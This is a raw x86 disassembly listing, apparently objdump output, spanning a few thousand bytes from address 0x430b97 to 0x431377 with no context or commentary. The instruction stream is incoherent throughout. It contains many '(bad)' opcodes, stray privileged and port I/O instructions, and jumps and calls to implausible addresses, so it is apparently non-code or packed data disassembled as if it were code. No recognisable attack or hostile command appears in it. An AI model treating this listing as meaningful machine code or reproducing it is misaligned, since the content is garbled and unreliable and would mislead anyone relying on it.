  430b97:	mov    esi,DWORD PTR [ebp-0x28]
  430b9a:	(bad)  
  430b9b:	retf   
  430b9c:	or     ecx,eax
  430b9e:	(bad)  
  430b9f:	dec    ebp
  430ba0:	pop    es
  430ba1:	(bad)  
  430ba2:	(bad)  
  430ba3:	or     BYTE PTR [esi],al
  430ba5:	jb     0x430b6d
  430ba7:	add    BYTE PTR [ebx],al
  430ba9:	inc    ebp
  430baa:	(bad)  
  430bab:	mov    ecx,DWORD PTR [edx]
  430bad:	fadd   st(6),st
  430baf:	ret    
  430bb0:	add    ah,BYTE PTR [ebp-0x37]
  430bb3:	int    0x55
  430bb5:	sub    ebp,esp
  430bb7:	add    edx,DWORD PTR [ecx-0x14]
  430bba:	inc    ebp
  430bbb:	inc    ebp
  430bbc:	mov    DWORD PTR [ebx-0x3c740b04],ecx
  430bc2:	cld    
  430bc3:	(bad)  
  430bc4:	(bad)  
  430bc5:	scas   eax,DWORD PTR es:[edi]
  430bc6:	loopne 0x430c03
  430bc8:	mov    DWORD PTR [edi],ecx
  430bca:	mov    ebp,ebp
  430bcc:	clc    
  430bcd:	push   eax
  430bcf:	push   DWORD PTR [ebp-0x4]
  430bd2:	mov    BYTE PTR [ebp+0xa],0xff
  430bd6:	(bad)  
  430bd7:	int3   
  430bd8:	or     BYTE PTR [eax],al
  430bda:	(bad)  
  430bdb:	lea    eax,[edi]
  430bdd:	ins    BYTE PTR es:[edi],dx
  430bde:	(bad)  
  430bdf:	inc    DWORD PTR [ecx]
  430be1:	push   eax
  430be2:	mov    BYTE PTR [ebp+0x9],0x8b
  430be6:	leave  
  430be7:	les    edx,FWORD PTR [ebp+0x0]
  430bea:	in     al,dx
  430beb:	call   DWORD PTR [ecx-0x75]
  430bee:	inc    ebp
  430bef:	cld    
  430bf0:	mov    DWORD PTR [eax+0x8b01fc],eax
  430bf6:	cld    
  430bf7:	xor    BYTE PTR [eax-0x76a8f98b],bh
  430bfd:	pop    es
  430bfe:	mov    eax,DWORD PTR [eax]
  430c00:	clc    
  430c01:	test   eax,esi
  430c03:	je     0x430c7a
  430c05:	mov    eax,esi
  430c07:	cld    
  430c08:	add    al,0x80
  430c0a:	add    WORD PTR [ecx+0x0],ax
  430c0e:	fiadd  DWORD PTR [eax]
  430c10:	mov    BYTE PTR [eax],0x3d
  430c13:	push   0xffffffc3
  430c15:	push   edi
  430c16:	mov    edx,DWORD PTR [eax+0x51]
  430c19:	pop    edi
  430c1a:	lea    ebx,[ebx-0x8]
  430c1d:	ret    0x45
  430c20:	mov    ecx,DWORD PTR [ebx-0x7240ae04]
  430c26:	xchg   eax,edi
  430c28:	mov    DWORD PTR [ebp-0x75],ecx
  430c2b:	push   esi
  430c2c:	clc    
  430c2d:	jne    0x430bff
  430c2f:	mov    ecx,0xf8450b0b
  430c34:	(bad)  
  430c35:	push   cs
  430c36:	or     BYTE PTR [ebp-0x3a],dh
  430c39:	cmp    eax,DWORD PTR [ecx]
  430c3b:	pop    esi
  430c3c:	(bad)  
  430c3d:	or     al,0x5
  430c3f:	inc    eax
  430c40:	leave  
  430c41:	jmp    0x40cf:0x25564204
  430c48:	leave  
  430c49:	in     eax,dx
  430c4a:	inc    DWORD PTR [eax-0x75]
  430c4d:	fimul  DWORD PTR [ebx-0x228139be]
  430c53:	inc    eax
  430c54:	nop
  430c55:	loopne 0x430c56
  430c57:	ret    
  430c58:	mov    ecx,DWORD PTR [ebx-0x7239ae75]
  430c5e:	add    eax,0xff45e8f8
  430c63:	push   esi
  430c64:	push   DWORD PTR [ebp-0x39]
  430c67:	mov    eax,0x7edda46
  430c6c:	or     al,0x6
  430c6e:	push   DWORD PTR [ebp-0x3a]
  430c71:	cmp    eax,DWORD PTR [edx]
  430c73:	pop    esi
  430c74:	ret    
  430c75:	or     al,0x56
  430c77:	inc    ecx
  430c78:	push   ebp
  430c79:	jle    0x430c67
  430c7b:	inc    edx
  430c7c:	inc    ebp
  430c7d:	int    0x1
  430c7f:	inc    ecx
  430c80:	sub    BYTE PTR ds:0xe77541fc,ah
  430c86:	add    DWORD PTR [edx+0x1c],eax
  430c89:	retf   0xc38b
  430c8c:	adc    al,0x8b
  430c8e:	xchg   edx,eax
  430c8f:	push   ecx
  430c90:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  430c96:	rcl    DWORD PTR [esi-0x9],cl
  430c99:	jne    0x430ceb
  430c9b:	mov    eax,0x7c80ece
  430ca0:	rol    DWORD PTR [esi],cl
  430ca2:	div    DWORD PTR [ebp+0x50]
  430ca5:	cmp    ecx,edx
  430ca7:	pop    esi
  430ca8:	dec    BYTE PTR [edx]
  430caa:	in     al,dx
  430cab:	inc    edx
  430cac:	sub    esp,ecx
  430cae:	inc    eax
  430caf:	(bad)  
  430cb0:	push   eax
  430cb1:	add    edx,DWORD PTR [eax-0x1f]
  430cb4:	push   edi
  430cb5:	add    dh,dh
  430cb7:	leave  
  430cb8:	adc    DWORD PTR [ebp-0x1],0xffffffec
  430cbc:	add    BYTE PTR [ecx+0x0],dl
  430cbf:	inc    ebp
  430cc0:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  430cc6:	add    BYTE PTR [eax-0x7fbf448],bh
  430ccc:	add    al,0x2
  430cce:	jmp    0x57eb828
  430cd3:	jne    0x430cbd
  430cd5:	mov    eax,DWORD PTR [edx]
  430cd7:	or     BYTE PTR [eax],al
  430cd9:	inc    ecx
  430cda:	stc    
  430cdb:	in     eax,dx
  430cdc:	ss inc eax
  430cde:	aas    
  430cdf:	out    0x7d,eax
  430ce1:	inc    ecx
  430ce2:	mov    ebp,ecx
  430ce4:	lock ret 0x7d
  430ce8:	and    ecx,DWORD PTR [ebx-0x171777]
  430cee:	add    bh,bh
  430cf0:	aad    0xd7
  430cf2:	add    dh,cl
  430cf4:	clts   
  430cf6:	(bad)  
  430cf7:	call   0xffce0bfc
  430cfc:	hlt    
  430cfd:	iret   
  430cfe:	jge    0x430cd6
  430d00:	rol    DWORD PTR [esi-0x80],cl
  430d03:	jmp    0x1c5c10
  430d08:	out    dx,al
  430d09:	mov    eax,DWORD PTR [ebx]
  430d0b:	(bad)  
  430d0c:	pop    esi
  430d0d:	push   es
  430d0e:	cmp    al,0xe8
  430d10:	sar    edi,0x8
  430d13:	inc    DWORD PTR [edi]
  430d15:	inc    esi
  430d16:	(bad)  
  430d17:	loopne 0x430d97
  430d19:	push   edi
  430d1a:	push   cs
  430d1b:	push   ebx
  430d1c:	add    BYTE PTR [ebx+0x24008b56],cl
  430d22:	add    BYTE PTR [ebp+0x50],al
  430d25:	push   eax
  430d26:	add    DWORD PTR [ebx+0x757d1834],ecx
  430d2c:	sub    edx,DWORD PTR [esi-0x24]
  430d2f:	jne    0x430ce7
  430d31:	lods   eax,DWORD PTR ds:[esi]
  430d32:	mov    edx,DWORD PTR [edx-0x34]
  430d35:	dec    esi
  430d36:	out    0x83,eax
  430d38:	into   
  430d39:	push   edi
  430d3b:	loopne 0x430d0b
  430d3d:	shr    BYTE PTR [edx+ecx*4+0x0],1
  430d41:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  430d48:	rol    DWORD PTR [edx],0x8
  430d4b:	mov    esp,ecx
  430d4d:	cmp    DWORD PTR [ebx],0xc
  430d50:	mov    esi,0x5001c0
  430d55:	push   eax
  430d56:	push   cs
  430d57:	push   eax
  430d58:	(bad)  
  430d59:	sub    edx,edi
  430d5b:	push   esi
  430d5c:	adc    al,0xcb
  430d5e:	ins    DWORD PTR es:[edi],dx
  430d5f:	mov    eax,0x203e8
  430d64:	add    al,ah
  430d66:	ror    BYTE PTR [eax+0xc007c0],0xc0
  430d6d:	add    dh,al
  430d6f:	add    ah,ch
  430d71:	rol    DWORD PTR [ebx-0x3595fb0d],1
  430d77:	pop    ecx
  430d78:	or     eax,ebx
  430d7a:	cli    
  430d7b:	add    BYTE PTR [ecx-0x4e728d1e],dh
  430d81:	lea    ebp,[ebx]
  430d83:	mov    edx,DWORD PTR [edx-0x4]
  430d86:	dec    ecx
  430d87:	inc    ebp
  430d88:	shr    BYTE PTR [ebx],0x4b
  430d8b:	and    al,0x0
  430d8d:	(bad)  
  430d8e:	jne    0x430dd5
  430d90:	pop    eax
  430d91:	mov    al,0x5a
  430d93:	call   0x1420ff2
  430d98:	and    al,0x85
  430d9a:	push   edx
  430d9b:	add    BYTE PTR [eax+eax*1+0x0],ah
  430d9f:	dec    ebp
  430da0:	mov    cl,0x23
  430da2:	jmp    0x430d90
  430da4:	mov    al,0xe7
  430da6:	call   0x1391094
  430dab:	shr    DWORD PTR [eax+ebx*2],cl
  430dae:	lock (bad) 
  430db0:	adc    eax,0x757f008d
  430db5:	out    0x58,eax
  430db7:	cmp    al,0x7
  430db9:	pop    edx
  430dba:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  430dc1:	push   ecx
  430dc2:	cld    
  430dc3:	mov    esi,0x3b0175
  430dc8:	and    al,0xb0
  430dca:	xor    BYTE PTR [edx+0x1],0x8b
  430dce:	add    ah,bh
  430dd0:	mov    edi,DWORD PTR [ebp-0x4]
  430dd3:	psubsw mm7,QWORD PTR [edi]
  430dd6:	add    DWORD PTR [ebp+0x0],ebp
  430dd9:	rcr    eax,1
  430ddb:	mov    edi,ecx
  430ddd:	and    eax,DWORD PTR [eax]
  430ddf:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  430de5:	call   0x13010ce
  430dea:	add    al,cl
  430dec:	mov    ebp,esi
  430dee:	aam    0x83
  430df0:	or     DWORD PTR [ecx],eax
  430df2:	jne    0x430de5
  430df4:	mov    eax,DWORD PTR [eax]
  430df6:	aam    0x0
  430df8:	dec    ebp
  430df9:	jne    0x430d86
  430dfb:	cmp    ebx,eax
  430dfd:	jb     0x430e4c
  430dff:	jmp    0x430d8c
  430e01:	mov    ebx,esp
  430e03:	int3   
  430e04:	dec    ebp
  430e05:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  430e0c:	mov    edx,0x8b0a8b
  430e11:	cmp    ecx,DWORD PTR [eax]
  430e13:	jb     0x430dec
  430e15:	pop    edx
  430e16:	push   edi
  430e17:	cli    
  430e18:	pop    es
  430e19:	mov    eax,ecx
  430e1b:	jb     0x430e1f
  430e1d:	add    DWORD PTR [ebx],0xa
  430e20:	mov    eax,DWORD PTR [ebx]
  430e22:	int3   
  430e23:	add    bh,BYTE PTR [esi+0x75d10006]
  430e29:	jmp    0x430db6
  430e2b:	mov    al,0xe8
  430e2d:	call   0x10410af
  430e32:	add    edx,DWORD PTR [ecx+ecx*8]
  430e35:	pop    edi
  430e36:	or     BYTE PTR [ecx-0x73],bl
  430e39:	pop    ecx
  430e3a:	inc    edi
  430e3b:	xor    al,0xeb
  430e3d:	push   ecx
  430e3e:	mov    edi,DWORD PTR [edx+0xc506cc]
  430e44:	call   0xb20f49
  430e49:	int3   
  430e4a:	sbb    BYTE PTR [esi],ch
  430e4c:	inc    ebp
  430e4d:	add    BYTE PTR [ebx-0x1f4f338b],cl
  430e53:	call   0x9c10c2
  430e58:	or     BYTE PTR [ebx-0x73],dl
  430e5b:	cmp    al,0x47
  430e5d:	mov    al,0x1
  430e5f:	jb     0x430e61
  430e61:	mov    al,0x10
  430e63:	push   eax
  430e64:	add    al,0x75
  430e66:	add    BYTE PTR [ebx],ch
  430e68:	add    ebx,esp
  430e6a:	int3   
  430e6b:	jne    0x430e7d
  430e6d:	movsx  edx,cl
  430e70:	add    DWORD PTR [eax],eax
  430e72:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  430e79:	mov    gs,edi
  430e7b:	add    BYTE PTR [eax-0x50],ch
  430e7e:	add    al,ch
  430e80:	mov    eax,DWORD PTR [ecx]
  430e82:	sub    eax,DWORD PTR [eax]
  430e84:	jb     0x430efb
  430e86:	add    DWORD PTR [esp+eiz*8-0x50],esi
  430e8a:	jge    0x430e74
  430e8c:	add    al,0x1
  430e8e:	add    DWORD PTR [eax],0x0
  430e91:	jne    0x430e93
  430e93:	je     0x430eda
  430e95:	mov    eax,DWORD PTR [edi]
  430e97:	ror    BYTE PTR [ebp+0x4d],1
  430e9a:	or     DWORD PTR [ecx+0x4d03d004],0x3
  430ea1:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  430ea7:	mov    DWORD PTR [ebx],ebp
  430ea9:	fadd   DWORD PTR [eax+0x75]
  430eac:	inc    eax
  430ead:	pop    eax
  430eae:	lea    ebx,[ecx+0x4f]
  430eb1:	push   0xb1000003
  430eb6:	out    dx,eax
  430eb7:	add    ebp,DWORD PTR [edx+edx*2]
  430eba:	add    BYTE PTR [ebx+ecx*4],bh
  430ebd:	mov    ch,BYTE PTR [ebx]
  430ebf:	jb     0x430f33
  430ec1:	add    al,0x89
  430ec3:	push   eax
  430ec4:	call   0x842b5c36
  430ec9:	add    DWORD PTR [eax+eax*1],eax
  430ecc:	jae    0x430ee2
  430ece:	icebp  
  430ecf:	inc    ebp
  430ed0:	mov    eax,DWORD PTR gs:[ecx]
  430ed3:	int3   
  430ed4:	out    dx,al
  430ed5:	loopne 0x430f24
  430ed7:	sub    eax,DWORD PTR [edx]
  430ed9:	push   0xffffff83
  430edb:	pop    esi
  430edc:	push   cs
  430edd:	jl     0x430ef8
  430edf:	add    al,0xaf
  430ee1:	xor    eax,0x832b6d00
  430ee6:	mov    eax,DWORD PTR [edx]
  430ee8:	rcr    BYTE PTR [ebp+0x754500dc],cl
  430eee:	ror    DWORD PTR [ebx+0x7dc8e803],1
  430ef4:	inc    ebp
  430ef5:	shr    ebx,0x3
  430ef8:	or     DWORD PTR [eax],0x4
  430efb:	push   0xffffffa5
  430efd:	pop    esi
  430efe:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  430f05:	jmp    0x430f64
  430f07:	mov    edi,0xff0272
  430f0c:	fdivr  QWORD PTR [ebp+0x5d]
  430f0f:	push   0x4e
  430f11:	pop    ecx
  430f12:	call   0x435317
  430f17:	mov    DWORD PTR [ebx],eax
  430f19:	in     al,0xc8
  430f1b:	rol    BYTE PTR [ebp-0x75],0xc1
  430f1f:	call   0xad1100
  430f24:	pop    esi
  430f25:	enter  0xceff,0x8b
  430f29:	repz mov ecx,DWORD PTR [ebp-0x34]
  430f2d:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  430f34:	je     0x430f36
  430f36:	or     DWORD PTR [ebx-0x74183b24],eax
  430f3c:	jne    0x430f22
  430f3e:	jmp    0x430f39
  430f40:	push   DWORD PTR [edx-0x24]
  430f43:	push   0x4d
  430f45:	pop    ecx
  430f46:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  430f4a:	jge    0x430f52
  430f4c:	mov    eax,eax
  430f4e:	sub    ebp,DWORD PTR [edx+0x24]
  430f51:	pop    esi
  430f52:	inc    ebp
  430f53:	mov    esp,0x8b6077
  430f58:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  430f5e:	lods   al,BYTE PTR ds:[esi]
  430f5f:	add    BYTE PTR [ebx],bh
  430f61:	enter  0xce73,0x49
  430f65:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  430f6d:	stc    
  430f6e:	jge    0x430fe2
  430f70:	jnp    0xdd4292df
  430f76:	call   0xc6104c
  430f7b:	fadd   st(0),st
  430f7d:	dec    esi
  430f7e:	ins    BYTE PTR es:[edi],dx
  430f7f:	stc    
  430f80:	cmp    al,0x73
  430f82:	push   ebp
  430f83:	mov    eax,0xf8028b
  430f88:	jne    0x430f4b
  430f8a:	mov    esi,ecx
  430f8c:	mov    esp,DWORD PTR [ebp+0x2c]
  430f8f:	add    edi,DWORD PTR [ebp-0x24]
  430f92:	sub    esp,eax
  430f94:	and    al,0x45
  430f96:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  430f9c:	sbb    al,0xee
  430f9e:	pop    esi
  430f9f:	call   0x830fcf
  430fa4:	fsubr  st,st(3)
  430fa6:	sti    
  430fa7:	add    BYTE PTR gs:[ecx],bh
  430faa:	add    eax,esp
  430fac:	add    DWORD PTR [esi],eax
  430fae:	rol    DWORD PTR [ebp+0x8],0x29
  430fb2:	mov    esp,eax
  430fb4:	clc    
  430fb5:	jne    0x43102c
  430fb7:	mov    eax,0x8b0673
  430fbc:	loopne 0x431003
  430fbe:	loopne 0x430f49
  430fc0:	lods   al,BYTE PTR ds:[esi]
  430fc1:	int3   
  430fc2:	inc    ebp
  430fc3:	mov    DWORD PTR gs:[eax+edi*8],eax
  430fc7:	add    al,0xc3
  430fc9:	sub    ecx,DWORD PTR [ebp+0x47]
  430fcc:	(bad)  
  430fce:	shr    BYTE PTR [ebp-0x1f],0xe8
  430fd2:	add    eax,DWORD PTR [eax]
  430fd4:	call   0x644d0d9
  430fd9:	add    esi,DWORD PTR [esi-0x3b2efc83]
  430fdf:	dec    esi
  430fe0:	ins    DWORD PTR es:[edi],dx
  430fe1:	in     al,dx
  430fe2:	lea    eax,[eax]
  430fe4:	inc    ebp
  430fe5:	inc    ebp
  430fe6:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  430fec:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  430ff6:	and    al,0xdc
  430ff8:	ror    DWORD PTR [edx+0x24],0xf7
  430ffc:	or     BYTE PTR [ebp+0x4c],dh
  430fff:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  431003:	stos   BYTE PTR es:[edi],al
  431004:	adc    edx,edi
  431006:	inc    esp
  431007:	add    edi,DWORD PTR [eax]
  431009:	jne    0x430fee
  43100b:	mov    DWORD PTR [eax-0x7449db04],ecx
  431011:	cmp    ecx,DWORD PTR [edi]
  431013:	sub    BYTE PTR [ebp-0x7e],dl
  431016:	sar    ebp,0xb
  431019:	jmp    FWORD PTR [edi+0x2400392a]
  43101f:	sub    esi,DWORD PTR [ebx-0x73]
  431022:	mov    esp,DWORD PTR [ecx+edi*4]
  431025:	mov    ecx,DWORD PTR [eax]
  431027:	and    BYTE PTR [eax],al
  431029:	jne    0x430ff5
  43102b:	sub    ebp,ecx
  43102d:	sbb    BYTE PTR [esi+0x32],ah
  431030:	dec    ebp
  431031:	push   ebp
  431032:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  431038:	ret    
  431039:	mov    edx,ebp
  43103b:	leave  
  43103c:	sub    DWORD PTR [esi+0x24],ebx
  43103f:	ret    0x2b
  431042:	pop    ax
  431044:	push   ebp
  431045:	rol    BYTE PTR [ebx],0xeb
  431048:	add    DWORD PTR [ecx+0x6c0001],0x40
  43104f:	jb     0x4310a6
  431051:	ret    
  431052:	in     al,dx
  431053:	jecxz  0x430fe0
  431055:	push   esi
  431056:	xchg   esp,eax
  431057:	jne    0x431059
  431059:	cmp    edx,DWORD PTR [esi+0x1c]
  43105c:	jne    0x431042
  43105e:	mov    eax,DWORD PTR [ebp-0x77]
  431061:	ror    DWORD PTR [ebx+0x899408],0xe0
  431068:	mov    esi,DWORD PTR [ebp-0x75]
  43106b:	pop    esi
  43106c:	nop
  43106d:	mov    eax,DWORD PTR [eax]
  43106f:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  431075:	add    al,0x0
  431077:	inc    ebp
  431078:	mov    eax,DWORD PTR [ebx]
  43107a:	mov    ebp,ebx
  43107c:	cmp    al,0xf
  43107e:	or     al,al
  431080:	inc    ebp
  431081:	inc    ebp
  431082:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  431088:	cld    
  431089:	add    BYTE PTR [edi+0x546c16c0],dh
  43108f:	add    BYTE PTR [ecx-0x5],dl
  431092:	add    eax,0x17200
  431097:	sbb    al,0x85
  431099:	dec    esp
  43109a:	je     0x4310d4
  43109c:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  4310a0:	add    BYTE PTR [ebx],bh
  4310a2:	(bad)  
  4310a3:	and    al,0x32
  4310a5:	jae    0x431043
  4310a7:	mov    cl,cl
  4310a9:	inc    DWORD PTR [esp]
  4310ac:	push   ebp
  4310ad:	shr    esp,0x8
  4310b0:	in     al,dx
  4310b1:	push   esp
  4310b2:	add    DWORD PTR [eax],esp
  4310b4:	add    bl,cl
  4310b6:	inc    ebp
  4310b7:	mov    bh,0x89
  4310b9:	add    ah,bh
  4310bb:	jmp    0xca752005
  4310c0:	pushf  
  4310c1:	dec    esp
  4310c2:	mov    edx,0xf8178520
  4310c7:	fst    DWORD PTR [ebp+0x0]
  4310ca:	mov    BYTE PTR [eax],0xc4
  4310cd:	sub    edx,DWORD PTR [ebx-0x3f]
  4310d0:	inc    ebp
  4310d1:	add    eax,0xc601da
  4310d6:	mov    al,0xc6
  4310d9:	ins    BYTE PTR es:[edi],dx
  4310da:	mov    DWORD PTR [eax+0x57],0x2c0545c1
  4310e1:	dec    esp
  4310e2:	jmp    DWORD PTR [eax]
  4310e4:	inc    ebp
  4310e5:	fnstcw WORD PTR [esi+0x29]
  4310e8:	test   BYTE PTR [eax],0xc8
  4310eb:	rol    BYTE PTR [eax],0xc0
  4310ee:	lea    ecx,[ebp-0x3cf0dbcb]
  4310f4:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  4310fa:	inc    esi
  4310fb:	add    DWORD PTR [eax],ebx
  4310fd:	add    dh,bh
  4310ff:	mov    esi,DWORD PTR [edx+0x8]
  431102:	(bad)  
  431103:	fdiv   QWORD PTR ss:[ecx]
  431106:	(bad)  
  431107:	mov    bl,ch
  431109:	add    esi,eax
  43110b:	add    dh,bl
  43110d:	or     esi,eax
  43110f:	mov    dl,0xdf
  431111:	add    esi,eax
  431113:	add    al,ah
  431115:	push   cs
  431116:	mov    BYTE PTR [edx+0xc601e1],0xe2
  43111d:	or     BYTE PTR [ebx],dh
  43111f:	dec    ecx
  431120:	lea    eax,[ebx]
  431122:	xor    eax,0x18fc0fc7
  431127:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431128:	repz clc 
  43112a:	add    eax,DWORD PTR [ebp+0x46]
  43112d:	prefetcht0 BYTE PTR [ecx-0x2]
  431131:	xor    eax,0x7c60872
  431136:	mov    esp,0xbd32c69b
  43113b:	pop    esi
  43113c:	mov    cl,0xbe
  43113f:	or     al,0xc6
  431141:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  431148:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  43114f:	add    dh,al
  431151:	mov    eax,ebx
  431153:	xor    DWORD PTR [ebx],0x35008dbc
  431159:	mov    ecx,DWORD PTR [edi]
  43115b:	sbb    al,0x18
  43115d:	inc    ebp
  43115e:	xrelease mov DWORD PTR [ebx],0x188546f4
  431165:	clc    
  431166:	(bad)  
  431167:	xor    DWORD PTR [edx-0x64],esi
  43116a:	lea    ecx,[ecx+0x45ffe838]
  431170:	mov    ecx,ebx
  431172:	fadd   st,st(6)
  431174:	dec    ebp
  431175:	lds    edi,FWORD PTR [eax+0x7145fc56]
  43117b:	out    0x1,eax
  43117d:	inc    ebp
  43117e:	lea    ebp,ds:0xc8ffc6ff
  431184:	enter  0xa33,0xc6
  431188:	push   ebp
  431189:	leave  
  43118a:	(bad)  
  43118b:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  431191:	add    BYTE PTR [ebp+0x44],al
  431194:	mov    eax,esp
  431196:	mov    WORD PTR [esi+0x46398300],?
  43119c:	psubusw mm4,QWORD PTR [esi-0x78]
  4311a0:	add    BYTE PTR [ebx-0x1303f975],al
  4311a6:	add    BYTE PTR [ebp+0x1],0xeb
  4311aa:	add    BYTE PTR [ebp+0x38],al
  4311ad:	in     eax,dx
  4311ae:	inc    ebp
  4311af:	inc    ebp
  4311b0:	mov    ebx,ebx
  4311b2:	add    BYTE PTR [ebp+0x0],0xec
  4311b6:	mov    DWORD PTR [ebp-0x41],eax
  4311b9:	sub    eax,0x2c00454e
  4311be:	ins    DWORD PTR es:[edi],dx
  4311bf:	inc    ebp
  4311c0:	add    BYTE PTR [esi+0x66],bh
  4311c3:	test   BYTE PTR [ebp-0x2300bc],0xb6
  4311ca:	mov    DWORD PTR [ebx-0x2699b977],0x83b888ff
  4311d4:	dec    edi
  4311d5:	pop    es
  4311d6:	add    ah,ch
  4311d8:	mov    DWORD PTR [ebp+0x68],eax
  4311db:	in     eax,dx
  4311dc:	inc    DWORD PTR [ebp-0x7d]
  4311df:	out    0xc0,al
  4311e1:	inc    ebp
  4311e2:	mov    edx,esp
  4311e4:	push   0x45
  4311e6:	(bad)  
  4311e7:	jmp    0xdf9257a4
  4311ec:	add    BYTE PTR [ebp-0x77],al
  4311ef:	out    dx,al
  4311f0:	ins    BYTE PTR es:[edi],dx
  4311f1:	inc    ebp
  4311f2:	jmp    edi
  4311f4:	add    DWORD PTR [ebp-0x14],0x7e
  4311f8:	mov    esi,esi
  4311fa:	outs   dx,BYTE PTR ds:[esi]
  4311fb:	inc    esp
  4311fc:	(bad)  
  4311fd:	mov    esp,0x8341b68d
  431202:	mov    DWORD PTR [esi+0x70],eax
  431205:	fcos   
  431207:	mov    BYTE PTR [ebx-0x76f7ca7d],al
  43120d:	in     al,dx
  43120e:	jb     0x431195
  431210:	(bad)  
  431211:	dec    DWORD PTR [ebx-0x7aba9901]
  431217:	mov    edi,edi
  431219:	fdivr  st,st(7)
  43121b:	out    dx,eax
  43121c:	rcl    BYTE PTR [ebx],0x66
  43121f:	mov    DWORD PTR [ebp-0xc70075],eax
  431225:	(bad)  
  431226:	std    
  431227:	cmp    eax,DWORD PTR [eax]
  431229:	jne    0x431291
  43122b:	mov    DWORD PTR [ebp-0xba0048],eax
  431231:	in     al,dx
  431232:	outs   dx,BYTE PTR ds:[esi]
  431233:	pushf  
  431234:	add    BYTE PTR [ebx-0x7f7a039a],cl
  43123a:	inc    DWORD PTR [ecx]
  43123c:	inc    DWORD PTR [eax]
  43123e:	jae    0x431278
  431240:	add    BYTE PTR [ebp+0x850266],al
  431246:	inc    DWORD PTR [ebp-0x1]
  431249:	mov    eax,eax
  43124b:	jl     0x4312b3
  43124d:	add    BYTE PTR [ebp-0x740077],al
  431253:	cld    
  431254:	dec    eax
  431255:	add    BYTE PTR [eax],0x1
  431258:	data16 add BYTE PTR [ebp+0x38],al
  43125c:	mov    eax,0x47c2
  431261:	mov    eax,0x824f89
  431266:	inc    edi
  431267:	mov    DWORD PTR [edx+0x64],ebp
  43126a:	inc    WORD PTR [ebp-0x75]
  43126e:	(bad)  
  43126f:	data16 rol BYTE PTR [ebp-0x16001a],1
  431276:	inc    ebp
  431277:	jge    0x431258
  431279:	add    bh,ah
  43127b:	lea    ax,[ebp-0x750030]
  431282:	add    al,0x46
  431285:	jmp    0x40ff:0x8885
  43128b:	push   DWORD PTR [ebp+0x52]
  43128e:	lea    eax,[eax]
  431290:	shl    BYTE PTR [esi-0x7b],1
  431293:	test   esi,edi
  431295:	(bad)  
  431296:	(bad)  
  431297:	inc    DWORD PTR [ebp-0x990140]
  43129d:	test   DWORD PTR [ebx+0x54fff4ff],ecx
  4312a3:	inc    edi
  4312a4:	push   ecx
  4312a5:	xor    ax,WORD PTR [ebp-0x8d0045]
  4312ac:	add    al,al
  4312ae:	ret    
  4312af:	mov    ax,WORD PTR [ebp-0x3f0004]
  4312b6:	push   eax
  4312b7:	mov    DWORD PTR [ebp-0x77],0xff98748b
  4312be:	add    BYTE PTR [ebx-0x764f8839],al
  4312c4:	push   DWORD PTR [esi+0x1]
  4312c7:	inc    DWORD PTR [eax]
  4312c9:	mov    eax,0xff99ff
  4312ce:	or     BYTE PTR [ecx-0x7a87bb],cl
  4312d4:	jne    0x43128e
  4312d6:	add    DWORD PTR [edx-0x76edff71],0xff707a8e
  4312e0:	mov    ecx,0xd74fb8
  4312e5:	add    cl,al
  4312e7:	mov    DWORD PTR [ecx-0x3f007784],ecx
  4312ed:	or     DWORD PTR [ebx+0x558966dc],0x7e
  4312f4:	(bad)  
  4312f5:	push   ebp
  4312f7:	mov    eax,0x8c2789
  4312fc:	ret    0x6689
  4312ff:	adc    BYTE PTR [ebp+0x48],0x8d
  431303:	add    bh,ah
  431305:	mov    WORD PTR [ebp-0x70],ax
  431309:	(bad)  
  43130a:	ret    0x667d
  43130d:	or     BYTE PTR [ebp-0x77],dl
  431310:	lea    eax,[ecx+eiz*8-0x6b1276bb]
  431317:	loop   0x4312a2
  431319:	(bad)  
  43131a:	xchg   esi,eax
  43131b:	aam    0xcf
  43131d:	out    dx,al
  43131e:	mov    DWORD PTR [esi-0x68],edi
  431321:	inc    ebp
  431322:	dec    edx
  431323:	pop    ecx
  431324:	mov    edx,DWORD PTR [eax]
  431326:	repnz push bp
  431329:	or     BYTE PTR [ebx+0x55106638],0x49
  431330:	(bad)  
  431331:	repnz xor eax,0xa0898945
  431337:	mov    ah,0x89
  431339:	jmp    DWORD PTR [edx+0x66b0418d]
  43133f:	inc    DWORD PTR [ebp+0x50]
  431342:	add    DWORD PTR [ebp-0x5],0xffffffbe
  431346:	mov    DWORD PTR [eax],ecx
  431348:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431349:	pop    es
  43134a:	inc    ecx
  43134b:	(bad)  
  43134c:	data16 fwait
  43134e:	inc    ebp
  43134f:	xor    ah,BYTE PTR [esi+0x3]
  431352:	dec    ebp
  431353:	push   eax
  431354:	inc    bp
  431356:	jge    0x4312db
  431358:	mov    esp,DWORD PTR [esi-0x18]
  43135b:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  431361:	add    DWORD PTR [ebx],esi
  431363:	add    BYTE PTR [ebx],al
  431365:	test   DWORD PTR [ebx],esi
  431367:	(bad)  
  431368:	inc    WORD PTR [ebp+0x0]
  43136c:	mov    eax,DWORD PTR [eax]
  43136e:	call   0x8898caa3
  431373:	mov    esi,eax
  431375:	clc    
  431376:	ret    
  431377:	rol    cl,0xa
